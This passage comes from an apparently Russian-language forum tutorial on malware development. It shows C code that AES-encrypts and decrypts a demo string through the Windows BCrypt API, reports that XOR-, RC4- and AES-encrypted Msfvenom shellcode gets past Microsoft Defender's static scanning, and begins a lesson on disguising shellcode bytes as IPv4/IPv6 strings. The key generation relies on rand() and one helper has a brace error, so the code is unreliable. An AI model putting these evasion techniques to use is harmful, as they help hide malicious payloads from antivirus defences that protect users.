  STATUS = BCryptDecrypt(hKeyHandle, (PUCHAR)pAes-&gt;pCipherText, (ULONG)pAes-&gt;dwCipherSize, NULL, pAes-&gt;pIv, IVSIZE, pbPlainText, cbPlainText, &amp;cbResult, BCRYPT_BLOCK_PADDING);
  if (!NT_SUCCESS(STATUS)) {
        printf(&quot;[!] BCryptDecrypt[2] Failed With Error: 0x%0.8X \n&quot;, STATUS);
        bSTATE = FALSE; goto _EndOfFunc;
  }

  // Clean up
_EndOfFunc:
  if (hKeyHandle)
        BCryptDestroyKey(hKeyHandle);
  if (hAlgorithm)
        BCryptCloseAlgorithmProvider(hAlgorithm, 0);
  if (pbKeyObject)
        HeapFree(GetProcessHeap(), 0, pbKeyObject);
  if (pbPlainText != NULL &amp;&amp; bSTATE) {
        // if everything went well, we save pbPlainText and cbPlainText
        pAes-&gt;pPlainText   = pbPlainText;
        pAes-&gt;dwPlainSize  = cbPlainText;
  }
  return bSTATE;

}</code></pre>
	</div>
</div><br />
<b>–î–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω—ã–µ –≤—Å–ø–æ–º–æ–≥–∞—Ç–µ–ª—å–Ω—ã–µ —Ñ—É–Ω–∫—Ü–∏–∏</b><br />
<br />
–ö–æ–¥ —Ç–∞–∫–∂–µ –≤–∫–ª—é—á–∞–µ—Ç –≤ —Å–µ–±—è –¥–≤–µ –Ω–µ–±–æ–ª—å—à–∏–µ –≤—Å–ø–æ–º–æ–≥–∞—Ç–µ–ª—å–Ω—ã–µ —Ñ—É–Ω–∫—Ü–∏–∏: PrintHexData –∏ GenerateRandomBytes.<br />
<br />
–ü–µ—Ä–≤–∞—è —Ñ—É–Ω–∫—Ü–∏—è, PrintHexData, –≤—ã–≤–æ–¥–∏—Ç –≤—Ö–æ–¥–Ω–æ–π –±—É—Ñ–µ—Ä –≤ –≤–∏–¥–µ –º–∞—Å—Å–∏–≤–∞ —Å–∏–º–≤–æ–ª–æ–≤ –≤ —Å–∏–Ω—Ç–∞–∫—Å–∏—Å–µ C –Ω–∞ –∫–æ–Ω—Å–æ–ª—å.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>// –í—ã–≤–æ–¥ –≤—Ö–æ–¥–Ω–æ–≥–æ –±—É—Ñ–µ—Ä–∞ –≤ –≤–∏–¥–µ —à–µ—Å—Ç–Ω–∞–¥—Ü–∞—Ç–µ—Ä–∏—á–Ω–æ–≥–æ –º–∞—Å—Å–∏–≤–∞ —Å–∏–º–≤–æ–ª–æ–≤
VOID PrintHexData(LPCSTR Name, PBYTE Data, SIZE_T Size) {

  printf(&quot;unsigned char %s[] = {&quot;, Name);

  for (int i = 0; i &lt; Size; i++) {
        if (i % 16 == 0)
              printf(&quot;\n\t&quot;);

        if (i &lt; Size - 1) {
            printf(&quot;0x%0.2X, &quot;, Data[i]);
        else
              printf(&quot;0x%0.2X &quot;, Data[i]);
  }

  printf(&quot;};\n\n\n&quot;);

}</code></pre>
	</div>
</div><br />
–î—Ä—É–≥–∞—è —Ñ—É–Ω–∫—Ü–∏—è, GenerateRandomBytes, –∑–∞–ø–æ–ª–Ω—è–µ—Ç –≤—Ö–æ–¥–Ω–æ–π –±—É—Ñ–µ—Ä —Å–ª—É—á–∞–π–Ω—ã–º–∏ –±–∞–π—Ç–∞–º–∏, –∫–æ—Ç–æ—Ä—ã–µ –≤ —ç—Ç–æ–º –∫–æ–Ω—Ç–µ–∫—Å—Ç–µ –∏—Å–ø–æ–ª—å–∑—É—é—Ç—Å—è –¥–ª—è –≥–µ–Ω–µ—Ä–∞—Ü–∏–∏ —Å–ª—É—á–∞–π–Ω–æ–≥–æ –∫–ª—é—á–∞ –∏ –∏–Ω–∏—Ü–∏–∞–ª–∏–∑–∏—Ä—É—é—â–µ–≥–æ –≤–µ–∫—Ç–æ—Ä–∞ (IV).<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>// –ì–µ–Ω–µ—Ä–∞—Ü–∏—è —Å–ª—É—á–∞–π–Ω—ã—Ö –±–∞–π—Ç –∑–∞–¥–∞–Ω–Ω–æ–≥–æ —Ä–∞–∑–º–µ—Ä–∞
VOID GenerateRandomBytes(PBYTE pByte, SIZE_T sSize) {

  for (int i = 0; i &lt; sSize; i++) {
        pByte[i] = (BYTE)rand() % 0xFF;
  }

}</code></pre>
	</div>
</div><br />
<b>–ü—Ä–∏–º–µ—Ä –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—è:</b><br />
<br />
–ù–∏–∂–µ –ø—Ä–µ–¥—Å—Ç–∞–≤–ª–µ–Ω–∞ –æ—Å–Ω–æ–≤–Ω–∞—è —Ñ—É–Ω–∫—Ü–∏—è, –∫–æ—Ç–æ—Ä–∞—è –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è –¥–ª—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è –ø—Ä–æ—Ü–µ–¥—É—Ä—ã —à–∏—Ñ—Ä–æ–≤–∞–Ω–∏—è –º–∞—Å—Å–∏–≤–∞ –æ—Ç–∫—Ä—ã—Ç–æ–≥–æ —Ç–µ–∫—Å—Ç–∞.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>// The plaintext, in hex format, that will be encrypted
// this is the following string in hex &quot;This is a plain text string, we&#039;ll try to encrypt/decrypt !&quot;
unsigned char Data[] = {
    0x54, 0x68, 0x69, 0x73, 0x20, 0x69, 0x73, 0x20, 0x61, 0x20, 0x70, 0x6C,
    0x61, 0x69, 0x6E, 0x20, 0x74, 0x65, 0x78, 0x74, 0x20, 0x73, 0x74, 0x72,
    0x69, 0x6E, 0x67, 0x2C, 0x20, 0x77, 0x65, 0x27, 0x6C, 0x6C, 0x20, 0x74,
    0x72, 0x79, 0x20, 0x74, 0x6F, 0x20, 0x65, 0x6E, 0x63, 0x72, 0x79, 0x70,
    0x74, 0x2F, 0x64, 0x65, 0x63, 0x72, 0x79, 0x70, 0x74, 0x20, 0x21
};

int main() {

    BYTE pKey [KEYSIZE];                    // KEYSIZE is 32 bytes
    BYTE pIv [IVSIZE];                      // IVSIZE is 16 bytes

    srand(time(NULL));                      // The seed to generate the key. This is used to further randomize the key.
    GenerateRandomBytes(pKey, KEYSIZE);     // Generating a key with the helper function

    srand(time(NULL) ^ pKey[0]);            // The seed to generate the IV. Use the first byte of the key to add more randomness.
    GenerateRandomBytes(pIv, IVSIZE);       // Generating the IV with the helper function

    // Printing both key and IV onto the console
    PrintHexData(&quot;pKey&quot;, pKey, KEYSIZE);
    PrintHexData(&quot;pIv&quot;, pIv, IVSIZE);

    // Defining two variables the output buffer and its respective size which will be used in SimpleEncryption
    PVOID pCipherText = NULL;
    DWORD dwCipherSize = NULL;

    // Encrypting
    if (!SimpleEncryption(Data, sizeof(Data), pKey, pIv, &amp;pCipherText, &amp;dwCipherSize)) {
        return -1;
    }

    // Print the encrypted buffer as a hex array
    PrintHexData(&quot;CipherText&quot;, pCipherText, dwCipherSize);

    // Clean up
    HeapFree(GetProcessHeap(), 0, pCipherText);
    system(&quot;PAUSE&quot;);
    return 0;
}</code></pre>
	</div>
</div><br />
–≠—Ç–æ—Ç –∫–æ–¥ –¥–µ–º–æ–Ω—Å—Ç—Ä–∏—Ä—É–µ—Ç, –∫–∞–∫ –º–æ–∂–Ω–æ —Ä–µ–∞–ª–∏–∑–æ–≤–∞—Ç—å —à–∏—Ñ—Ä–æ–≤–∞–Ω–∏–µ –¥–∞–Ω–Ω—ã—Ö —Å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º AES.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746773739714.png"
		data-src="https://osint42.org/attachments/1746773739714-png.79/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746773739714-png.79/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746773739714.png"
			title="1746773739714.png"
			width="1588" height="831" loading="lazy" />
	</div><br />
<br />
<b>–ü—Ä–∏–º–µ—Ä —Ä–∞—Å—à–∏—Ñ—Ä–æ–≤–∫–∏ –¥–∞–Ω–Ω—ã—Ö</b><br />
<br />
–ù–∏–∂–µ –ø—Ä–µ–¥—Å—Ç–∞–≤–ª–µ–Ω–∞ –æ—Å–Ω–æ–≤–Ω–∞—è —Ñ—É–Ω–∫—Ü–∏—è, –∫–æ—Ç–æ—Ä–∞—è –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è –¥–ª—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è –ø—Ä–æ—Ü–µ–¥—É—Ä—ã –¥–µ—à–∏—Ñ—Ä–æ–≤–∞–Ω–∏—è.<br />
<br />
–î–ª—è –ø—Ä–æ—Ü–µ–¥—É—Ä—ã –¥–µ—à–∏—Ñ—Ä–æ–≤–∞–Ω–∏—è —Ç—Ä–µ–±—É—é—Ç—Å—è –∫–ª—é—á –¥–µ—à–∏—Ñ—Ä–æ–≤–∞–Ω–∏—è, –∏–Ω–∏—Ü–∏–∞–ª–∏–∑–∏—Ä—É—é—â–∏–π –≤–µ–∫—Ç–æ—Ä (IV) –∏ —à–∏—Ñ—Ä—Ç–µ–∫—Å—Ç.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>// the key printed to the screen
unsigned char pKey[] = {
        0x3E, 0x31, 0xF4, 0x00, 0x50, 0xB6, 0x6E, 0xB8, 0xF6, 0x98, 0x95, 0x27, 0x43, 0x27, 0xC0, 0x55,
        0xEB, 0xDB, 0xE1, 0x7F, 0x05, 0xFE, 0x65, 0x6D, 0x0F, 0xA6, 0x5B, 0x00, 0x33, 0xE6, 0xD9, 0x0B };

// the iv printed to the screen
unsigned char pIv[] = {
        0xB4, 0xC8, 0x1D, 0x1D, 0x14, 0x7C, 0xCB, 0xFA, 0x07, 0x42, 0xD9, 0xED, 0x1A, 0x86, 0xD9, 0xCD };


// the encrypted buffer printed to the screen, which is:
unsigned char CipherText[] = {
        0x97, 0xFC, 0x24, 0xFE, 0x97, 0x64, 0xDF, 0x61, 0x81, 0xD8, 0xC1, 0x9E, 0x23, 0x30, 0x79, 0xA1,
        0xD3, 0x97, 0x5B, 0xAE, 0x29, 0x7F, 0x70, 0xB9, 0xC1, 0xEC, 0x5A, 0x09, 0xE3, 0xA4, 0x44, 0x67,
        0xD6, 0x12, 0xFC, 0xB5, 0x86, 0x64, 0x0F, 0xE5, 0x74, 0xF9, 0x49, 0xB3, 0x0B, 0xCA, 0x0C, 0x04,
        0x17, 0xDB, 0xEF, 0xB2, 0x74, 0xC2, 0x17, 0xF6, 0x34, 0x60, 0x33, 0xBA, 0x86, 0x84, 0x85, 0x5E };

int main() {

    // Defining two variables the output buffer and its respective size which will be used in SimpleDecryption
    PVOID    pPlaintext  = NULL;
    DWORD    dwPlainSize = NULL;

    // Decrypting
    if (!SimpleDecryption(CipherText, sizeof(CipherText), pKey, pIv, &amp;pPlaintext, &amp;dwPlainSize)) {
        return -1;
    }

    // Printing the decrypted data to the screen in hex format
    PrintHexData(&quot;PlainText&quot;, pPlaintext, dwPlainSize);

    // this will print: &quot;This is a plain text string, we&#039;ll try to encrypt/decrypt !&quot;
    printf(&quot;Data: %s \n&quot;, pPlaintext);

    // Clean up
    HeapFree(GetProcessHeap(), 0, pPlaintext);
    system(&quot;PAUSE&quot;);
    return 0;
}</code></pre>
	</div>
</div><br />
<div class="bbImageWrapper  js-lbImage" title="1746773620567.png"
		data-src="https://osint42.org/attachments/1746773620567-png.73/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746773620567-png.73/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746773620567.png"
			title="1746773620567.png"
			width="1429" height="775" loading="lazy" />
	</div><br />
<br />
<b>–ù–µ–¥–æ—Å—Ç–∞—Ç–∫–∏ –±–∏–±–ª–∏–æ—Ç–µ–∫–∏ bCrypt</b><br />
<br />
–û–¥–Ω–∏–º –∏–∑ –æ—Å–Ω–æ–≤–Ω—ã—Ö –Ω–µ–¥–æ—Å—Ç–∞—Ç–∫–æ–≤ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—è –æ–ø–∏—Å–∞–Ω–Ω–æ–≥–æ –≤—ã—à–µ –º–µ—Ç–æ–¥–∞ –¥–ª—è —Ä–µ–∞–ª–∏–∑–∞—Ü–∏–∏ —à–∏—Ñ—Ä–æ–≤–∞–Ω–∏—è AES —è–≤–ª—è–µ—Ç—Å—è —Ç–æ, —á—Ç–æ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ –∫—Ä–∏–ø—Ç–æ–≥—Ä–∞—Ñ–∏—á–µ—Å–∫–∏—Ö —Ñ—É–Ω–∫—Ü–∏–π WinAPI –ø—Ä–∏–≤–æ–¥–∏—Ç –∫ –∏—Ö –ø–æ—è–≤–ª–µ–Ω–∏—é –≤ —Ç–∞–±–ª–∏—Ü–µ –∏–º–ø–æ—Ä—Ç–∞ –∞–¥—Ä–µ—Å–æ–≤ (IAT) –±–∏–Ω–∞—Ä–Ω–æ–≥–æ —Ñ–∞–π–ª–∞.<br />
<br />
–†–µ—à–µ–Ω–∏—è  –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏ –º–æ–≥—É—Ç –æ–±–Ω–∞—Ä—É–∂–∏–≤–∞—Ç—å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ –∫—Ä–∏–ø—Ç–æ–≥—Ä–∞—Ñ–∏—á–µ—Å–∫–∏—Ö —Ñ—É–Ω–∫—Ü–∏–π, —Å–∫–∞–Ω–∏—Ä—É—è IAT, —á—Ç–æ –º–æ–∂–µ—Ç –ø–æ—Ç–µ–Ω—Ü–∏–∞–ª—å–Ω–æ —É–∫–∞–∑—ã–≤–∞—Ç—å –Ω–∞ –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω–æ–µ –ø–æ–≤–µ–¥–µ–Ω–∏–µ –∏–ª–∏ –≤—ã–∑–≤–∞—Ç—å –ø–æ–¥–æ–∑—Ä–µ–Ω–∏—è.<br />
–°–∫—Ä—ã—Ç–∏–µ WinAPI –≤ IAT –≤–æ–∑–º–æ–∂–Ω–æ –∏ –±—É–¥–µ—Ç –æ–±—Å—É–∂–¥–∞—Ç—å—Å—è –≤ —Å–ª–µ–¥—É—é—â–∏—Ö —Å—Ç–∞—Ç—å—è—Ö.<br />
<br />
–ù–∞ –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏–∏ –Ω–∏–∂–µ –ø–æ–∫–∞–∑–∞–Ω–∞ IAT –±–∏–Ω–∞—Ä–Ω–æ–≥–æ —Ñ–∞–π–ª–∞, –∏—Å–ø–æ–ª—å–∑—É—é—â–µ–≥–æ Windows API –¥–ª—è —à–∏—Ñ—Ä–æ–≤–∞–Ω–∏—è AES. –ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ –±–∏–±–ª–∏–æ—Ç–µ–∫–∏ crypt.dll –∏ –∫—Ä–∏–ø—Ç–æ–≥—Ä–∞—Ñ–∏—á–µ—Å–∫–∏—Ö —Ñ—É–Ω–∫—Ü–∏–π —è–≤–Ω–æ –≤–∏–¥–Ω–æ.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746773639033.png"
		data-src="https://osint42.org/attachments/1746773639033-png.74/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746773639033-png.74/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746773639033.png"
			title="1746773639033.png"
			width="1902" height="945" loading="lazy" />
	</div><br />
<br />
<span style="color: rgb(184, 49, 47)"><b><u><span style="font-size: 22px">–û–±—Ö–æ–¥ —Å—Ç–∞—Ç–∏—á–µ—Å–∫–æ–≥–æ –∞–Ω–∞–ª–∏–∑–∞ Microsoft Defender</span></u></b></span><br />
<br />
–ü—Ä–∏–º–µ—Ä –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—è –∞–ª–≥–æ—Ä–∏—Ç–º–æ–≤ —à–∏—Ñ—Ä–æ–≤–∞–Ω–∏—è XOR, RC4 –∏ AES –¥–ª—è –æ–±—Ö–æ–¥–∞ —Å—Ç–∞—Ç–∏—á–µ—Å–∫–æ–≥–æ –∞–Ω–∞–ª–∏–∑–∞—Ç–æ—Ä–∞ Microsoft Defender.<br />
–ù–∞ —ç—Ç–æ–º —ç—Ç–∞–ø–µ —É—á–µ–±–Ω–æ–≥–æ –º–æ–¥—É–ª—è –ø–æ–ª–µ–∑–Ω–∞—è –Ω–∞–≥—Ä—É–∑–∫–∞ (payload) –Ω–µ –≤—ã–ø–æ–ª–Ω—è–µ—Ç—Å—è, –æ–Ω–∞ –ø—Ä–æ—Å—Ç–æ –≤—ã–≤–æ–¥–∏—Ç—Å—è –Ω–∞ –∫–æ–Ω—Å–æ–ª—å. –ü–æ—ç—Ç–æ–º—É –≤ —ç—Ç–æ–º –º–æ–¥—É–ª–µ –æ—Å–Ω–æ–≤–Ω–æ–µ –≤–Ω–∏–º–∞–Ω–∏–µ —É–¥–µ–ª—è–µ—Ç—Å—è –∏—Å–∫–ª—é—á–∏—Ç–µ–ª—å–Ω–æ –æ–±—Ö–æ–¥—É —Å—Ç–∞—Ç–∏—á–µ—Å–∫–æ–≥–æ –∞–Ω–∞–ª–∏–∑–∞ –∏ —Å–∏–≥–Ω–∞—Ç—É—Ä–Ω–æ–º—É –æ–±–Ω–∞—Ä—É–∂–µ–Ω–∏—é.<br />
<br />
–ö–∞–∂–¥—ã–π –∏–∑ –ø—Ä–∏–º–µ—Ä–æ–≤ –∫–æ–¥–∞ –∏—Å–ø–æ–ª—å–∑—É–µ—Ç —à–µ–ª–ª-–∫–æ–¥ Msfvenom.<br />
<br />
<b>–ù–µ–æ–±—Ä–∞–±–æ—Ç–∞–Ω–Ω—ã–π —à–µ–ª–ª-–∫–æ–¥ (Raw Shellcode)</b> - –æ–±–Ω–∞—Ä—É–∂–µ–Ω Defender&#039;–æ–º.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746773651095.png"
		data-src="https://osint42.org/attachments/1746773651095-png.75/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746773651095-png.75/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746773651095.png"
			title="1746773651095.png"
			width="1358" height="669" loading="lazy" />
	</div><br />
<br />
<b>XOR-—à–∏—Ñ—Ä–æ–≤–∞–Ω–Ω—ã–π —à–µ–ª–ª-–∫–æ–¥</b> - —É—Å–ø–µ—à–Ω–æ –æ–±—Ö–æ–¥–∏—Ç Defender.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746773659154.png"
		data-src="https://osint42.org/attachments/1746773659154-png.76/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746773659154-png.76/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746773659154.png"
			title="1746773659154.png"
			width="1777" height="998" loading="lazy" />
	</div><br />
<br />
<b>AES-—à–∏—Ñ—Ä–æ–≤–∞–Ω–Ω—ã–π —à–µ–ª–ª-–∫–æ–¥</b> - —É—Å–ø–µ—à–Ω–æ –æ–±—Ö–æ–¥–∏—Ç Defender.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746773667064.png"
		data-src="https://osint42.org/attachments/1746773667064-png.77/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746773667064-png.77/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746773667064.png"
			title="1746773667064.png"
			width="1747" height="869" loading="lazy" />
	</div><br />
<br />
<b>RC4-—à–∏—Ñ—Ä–æ–≤–∞–Ω–Ω—ã–π —à–µ–ª–ª-–∫–æ–¥ </b>- —É—Å–ø–µ—à–Ω–æ –æ–±—Ö–æ–¥–∏—Ç Defender.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746773674642.png"
		data-src="https://osint42.org/attachments/1746773674642-png.78/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746773674642-png.78/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746773674642.png"
			title="1746773674642.png"
			width="1656" height="898" loading="lazy" />
	</div></div>
						

							<h2>–û–±—Ñ—É—Å–∫–∞—Ü–∏—è Payload</h2>

							

							

							<div class="bbWrapper"><div class="bbImageWrapper  js-lbImage" title="1746773857394.png"
		data-src="https://osint42.org/attachments/1746773857394-png.80/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746773857394-png.80/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746773857394.png"
			title="1746773857394.png"
			width="573" height="534" loading="lazy" />
	</div><br />
<br />
–í –ø—Ä–µ–¥—ã–¥—É—â–∏—Ö —Å—Ç–∞—Ç—å—è—Ö –æ–±—Å—É–∂–¥–∞–ª–∏—Å—å –≤–æ–ø—Ä–æ—Å—ã —Ä–∞–∑–º–µ—â–µ–Ω–∏—è –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–∏ –∏ –µ—ë —à–∏—Ñ—Ä–æ–≤–∞–Ω–∏–µ.<br />
<br />
–ù–æ –∫–∞–∫ —É–∂–µ –±—ã–ª–æ –∑–∞–º–µ—á–µ–Ω–æ —ç—Ç–æ–≥–æ –Ω–µ –¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ –¥–ª—è —Å–±–∏—Ç–∏—è –¥–µ—Ç–µ–∫—Ç–∞, –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ –æ–±–æ–π—Ç–∏ –µ—â—ë –¥–µ—Ç–µ–∫—Ç –ø–æ –ø–æ–≤–µ–¥–µ–Ω–∏—é –∏ —ç–º—É–ª—è—Ü–∏—é –∫–æ–¥–∞.<br />
<br />
–° –¥–µ—Ç–µ–∫—Ç–æ–º –ø–æ –ø–æ–≤–µ–¥–µ–Ω–∏—é –Ω–µ–º–Ω–æ–≥–æ —Å–ª–æ–∂–Ω–µ–µ, –Ω–æ –¥–µ—Ç–µ–∫—Ç –ø–æ —ç–º—É–ª—è—Ü–∏–∏ –∫–æ–¥–∞ –º–æ–∂–Ω–æ –æ–±–æ–π—Ç–∏ –∫–∞–∫ –≤–∞—Ä–∏–∞–Ω—Ç –æ–±—Ñ—É—Å–∫–∞—Ü–∏–µ–π —ç—Ç–æ–≥–æ —Å–∞–º–æ–≥–æ –∫–æ–¥–∞.)<br />
<br />
–ü—Ä–µ–¥–ª–∞–≥–∞—é –≤ —ç—Ç–æ–π —Å—Ç–∞—Ç—å–µ —Ä–∞—Å—Å–º–æ—Ç—Ä–µ—Ç—å –æ–±—Ñ—É—Å–∫–∞—Ü–∏—é –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–∏, –¥–∞–ª–µ–µ —É–∂–µ –≤—Å—ë –∑–∞–≤–∏—Å–∏—Ç —á—Ç–æ –¥–µ–ª–∞–µ—Ç –≤–∞—à–∞ –ü–û, –≤–æ–æ–±—â–µ –∏–∑–Ω–∞—á–∞–ª—å–Ω–æ –Ω—É–∂–Ω–æ –ø—Ä–æ–µ–∫—Ç–∏—Ä–æ–≤–∞—Ç—å —Å–æ—Ñ—Ç —Ç–∞–∫, —á—Ç–æ-–±—ã —É –Ω–µ–≥–æ –Ω–µ –±—ã–ª–æ –ø–æ–¥–æ–∑—Ä–∏—Ç–µ–ª—å–Ω–æ–≥–æ –ø–æ–≤–µ–¥–µ–Ω–∏—è.<br />
<br />
–í —Å—Ç–∞—Ç—å–µ –±—É–¥—É—Ç —Ä–∞—Å—Å–º–∞—Ç—Ä–∏–≤–∞—Ç—å—Å—è —Ç—Ä–∏ —Å–ø–æ—Å–æ–±–∞ –æ–±—Ñ—É—Å–∫–∞—Ü–∏–∏...<br />
<br />
–ß—Ç–æ-–±—ã –∞–Ω—Ç–∏–≤–∏—Ä—É—Å—É –∏–ª–∏ –∏—Å—Å–ª–µ–¥–æ–≤–∞—Ç–µ–ª—é –∫–æ–¥–∞ –±—ã–ª–æ —Ö–æ—Ä–æ—à–æ, —Ä–µ–∫–æ–º–µ–Ω–¥—É–µ—Ç—Å—è –ø—Ä–∏–º–µ–Ω—è—Ç—å —à–∏—Ñ—Ä–æ–≤–∞–Ω–∏–µ + –Ω–µ—Å–∫–æ–ª—å–∫–æ –º–µ—Ç–æ–¥–æ–≤ –æ–±—Ñ—É—Å–∫–∞—Ü–∏–∏ –≤ –∫–æ–º–ø–ª–µ–∫—Å–µ.)<br />
<br />
<b>1)IPv4/IPv6Fuscation</b> - —ç—Ç–æ –º–µ—Ç–æ–¥ –æ–±—Ñ—É—Å–∫–∞—Ü–∏–∏, –ø—Ä–∏ –∫–æ—Ç–æ—Ä–æ–º –±–∞–π—Ç—ã shellcode –ø—Ä–µ–æ–±—Ä–∞–∑—É—é—Ç—Å—è –≤ —Å—Ç—Ä–æ–∫–∏ IPv4 –∏–ª–∏ IPv6. –î–∞–≤–∞–π—Ç–µ —Ä–∞—Å—Å–º–æ—Ç—Ä–∏–º –Ω–µ—Å–∫–æ–ª—å–∫–æ –±–∞–π—Ç–æ–≤ –∏–∑ shellcode Msfvenom x64 calc –∏ –ø—Ä–æ–∞–Ω–∞–ª–∏–∑–∏—Ä—É–µ–º, –∫–∞–∫ –∏—Ö –º–æ–∂–Ω–æ –ø—Ä–µ–æ–±—Ä–∞–∑–æ–≤–∞—Ç—å –≤ —Å—Ç—Ä–æ–∫–∏ IPv4 –∏–ª–∏ IPv6. –î–ª—è —ç—Ç–æ–≥–æ –ø—Ä–∏–º–µ—Ä–∞ –∏—Å–ø–æ–ª—å–∑—É—é—Ç—Å—è —Å–ª–µ–¥—É—é—â–∏–µ –±–∞–π—Ç—ã:<br />
<br />
FC 48 83 E4 F0 E8 C0 00 00 00 41 51 41 50 52 51.<br />
<br />
<b>IPv4Fuscation</b> - –ü–æ—Å–∫–æ–ª—å–∫—É –∞–¥—Ä–µ—Å–∞ IPv4 —Å–æ—Å—Ç–æ—è—Ç –∏–∑ 4 –æ–∫—Ç–µ—Ç–æ–≤, IPv4Fuscation –∏—Å–ø–æ–ª—å–∑—É–µ—Ç 4 –±–∞–π—Ç–∞ –¥–ª—è –≥–µ–Ω–µ—Ä–∞—Ü–∏–∏ –æ–¥–Ω–æ–π —Å—Ç—Ä–æ–∫–∏ IPv4, –≥–¥–µ –∫–∞–∂–¥—ã–π –±–∞–π—Ç –ø—Ä–µ–¥—Å—Ç–∞–≤–ª—è–µ—Ç —Å–æ–±–æ–π –æ–∫—Ç–µ—Ç. –í–æ–∑—å–º–∏—Ç–µ –∫–∞–∂–¥—ã–π –±–∞–π—Ç, –∫–æ—Ç–æ—Ä—ã–π –≤ –¥–∞–Ω–Ω—ã–π –º–æ–º–µ–Ω—Ç –≤ —Ñ–æ—Ä–º–∞—Ç–µ hex, –∏ –ø—Ä–µ–æ–±—Ä–∞–∑—É–π—Ç–µ –µ–≥–æ –≤ –¥–µ—Å—è—Ç–∏—á–Ω—ã–π —Ñ–æ—Ä–º–∞—Ç, —á—Ç–æ–±—ã –ø–æ–ª—É—á–∏—Ç—å –æ–¥–∏–Ω –æ–∫—Ç–µ—Ç. –ù–∞–ø—Ä–∏–º–µ—Ä, FC —Ä–∞–≤–Ω–æ 252 –≤ –¥–µ—Å—è—Ç–∏—á–Ω–æ–π —Ñ–æ—Ä–º–µ, 48 —Ä–∞–≤–Ω–æ 72, 83 —Ä–∞–≤–Ω–æ 131, –∏ E4 —Ä–∞–≤–Ω–æ 228. –¢–∞–∫–∏–º –æ–±—Ä–∞–∑–æ–º, –ø–µ—Ä–≤—ã–µ 4 –±–∞–π—Ç–∞ –ø—Ä–∏–º–µ—Ä–∞ shellcode, FC 48 83 E4 –±—É–¥—É—Ç 252.72.131.228.<br />
<br />
